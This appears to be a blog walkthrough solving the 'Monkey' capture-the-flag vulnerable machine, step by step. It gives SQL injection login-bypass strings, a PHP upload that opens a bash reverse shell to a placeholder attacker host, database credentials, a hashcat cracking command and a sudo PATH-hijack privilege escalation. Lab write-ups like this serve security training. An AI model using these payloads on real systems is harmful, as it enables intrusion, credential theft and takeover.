---
title: How to Solve the Monkey Vulnerable Machine
description: Learn how to solve a CTF machine in this post. Discover how to perform a login bypass, decrypt hashes, escalate privileges, and more.
snippetone: Experiences
category: Experiences
SEOTitle: Monkey Vulnerable Machine
lang: en
date: 2023-07-01
---

**Please note that the following post contains spoilers and reveals the solution to a CTF machine. If you haven’t solved the machine yet and would like to try on your own, we recommend stopping here. Good luck!**

Download the machine [here](https://github.com/wanetty/monkey_vuln_machine)

In CTF events, participants aim to find vulnerabilities in systems and applications to gain unauthorized access and ultimately capture the "flag" or answer to a specific challenge. In this post, we'll go over how to solve a CTF machine step-by-step.

## Login Bypass

First, we'll attempt to access the application using a login bypass technique. To do this, you can try the following SQL injection examples:



```sql
test ' or 1 = 1 --  test 
' or 'a' = 'a' --
```


These injections exploit a vulnerability in the application code, allowing access without needing the correct credentials.

## File Upload

Once inside the application, we can take advantage of a file upload vulnerability to upload a file that establishes a Reverse Shell connection. For this, we can use a PHP file with the following content:



```php
<?php     
	exec("/bin/bash -c 'bash -i >& /dev/tcp/IP_DEL_ATACANTE/PUERTO 0>&1'"); 
?>
```


Replace "ATTACKER_IP" and "PORT" with your own IP address and an available port for the connection.

## Database Connection

Once we’ve achieved a Reverse Shell, we can look for database connection credentials in the application’s code. In this case, we find the credentials in the `login.php` file.

We use the credentials to connect to the database with the following command:


```bash
mysql -h mariadb -u Threepwood -pmonkeyisland user_db
```

## Hash Decryption

Inside the database, we find a file containing hashes. To decrypt them, we can use the `hashcat` tool and a list of common words. The command to decrypt the hashes in the `hashes.txt` file using the `rockyou.txt` wordlist is:



```bash
hashcat -m 0 hashes.txt /usr/share/wordlist/rockyou.txt
```


## Privilege Escalation

Finally, to escalate privileges, we search the system for a command that we can execute with superuser permissions. In this case, we find a script called `find_chest.sh` that can be run as a superuser without requiring a password. Additionally, this script uses the `cat` variable in a relative way, meaning we can manipulate the `$PATH` variable to run any command with superuser permissions. To do this, execute the following command:


```bash
sudo PATH=$(pwd):$PATH /home/Guybrush/find_chest.sh
```


This allows us to run any command we want with superuser permissions, completing the challenge.